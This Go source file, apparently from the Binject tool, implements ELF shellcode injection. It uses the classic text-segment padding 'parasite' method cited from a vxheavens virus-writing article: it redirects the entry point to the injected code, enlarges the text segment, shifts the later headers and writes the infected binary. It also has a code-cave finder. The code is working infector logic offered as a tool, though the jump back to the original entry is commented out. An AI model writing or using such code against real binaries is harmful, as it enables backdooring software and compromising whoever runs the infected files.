package bj

import (
	"log"

	"github.com/Binject/debug/elf"
)

// ElfBinject - Inject shellcode into an ELF binary
func ElfBinject(sourceFile string, destFile string, shellcode string, config *BinjectConfig) error {

	elfFile, err := elf.Open(sourceFile)
	if err != nil {
		return err
	}

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//

	if config.CodeCaveMode == true {
		log.Printf("Using Code Cave Method")
		caves, err := FindCaves(sourceFile)
		if err != nil {
			return err
		}
		for _, cave := range caves {
			for _, section := range elfFile.Sections {
				if cave.Start >= section.Offset && cave.End <= (section.Size+section.Offset) &&
					cave.End-cave.Start >= uint64(MIN_CAVE_SIZE) {
					log.Printf("Cave found (start/end/size): %d / %d / %d \n", cave.Start, cave.End, cave.End-cave.Start)
				}
			}
		}
	} else {
		log.Printf("Using New Section Method")
		log.Printf("Not Implemented yet")
	}
	//
	// END CODE CAVE DETECTION SECTION
	//

	/*
			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
		        6. Increase p_shoff by PAGE_SIZE in the ELF header
		        7. Patch the insertion code (parasite) to jump to the entry point (original)
		        1. Locate the text segment program header
		            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
		            -Increase p_filesz to account for the new code (parasite)
		            -Increase p_memsz to account for the new code (parasite)
		        2. For each phdr which is after the insertion (text segment)
		            -increase p_offset by PAGE_SIZE
		        3. For the last shdr in the text segment
		            -increase sh_len by the parasite length
		        4. For each shdr which is after the insertion
		            -Increase sh_offset by PAGE_SIZE
		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
					into the file - text segment p_offset + p_filesz (original)
	*/
	sc := []byte(shellcode)
	sclen := uint64(len(sc))
	PAGE_SIZE := uint64(4096)
	newOffset := uint64(0)

	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
	elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)
	// 7. Patch the insertion code (parasite) to jump to the entry point (original)
	// originalEntry := elfFile.FileHeader.Entry

	// 1. Locate the text segment program header
	afterTextSegment := false
	for _, p := range elfFile.Progs {
		if p.Type == elf.PT_LOAD && p.Flags&(elf.PF_R|elf.PF_X) != 0 {
			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
			// -Increase p_filesz to account for the new code (parasite)
			p.Filesz += sclen
			// -Increase p_memsz to account for the new code (parasite)
			p.Memsz += sclen

			newOffset = p.Off + p.Filesz
			afterTextSegment = true
		} else if afterTextSegment {
			//2. For each phdr which is after the insertion (text segment)
			//-increase p_offset by PAGE_SIZE
			p.Off += PAGE_SIZE
		}
	}

	//	3. For the last shdr in the text segment
	for _, s := range elfFile.Sections {
		if s.Offset >= newOffset {
			// 4. For each shdr which is after the insertion
			//	-Increase sh_offset by PAGE_SIZE
			s.Offset += PAGE_SIZE
		} else if s.Size+s.Addr == elfFile.FileHeader.Entry { // assuming entry was set to (p_vaddr + p_filesz) above
			//	-increase sh_len by the parasite length
			s.Size += sclen
		}
	}

	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
	//	into the file - text segment p_offset + p_filesz (original)
	insert := make([]byte, PAGE_SIZE)
	copy(insert, sc)
	elfFile.Insertion = insert

	return elfFile.Write(destFile)
}
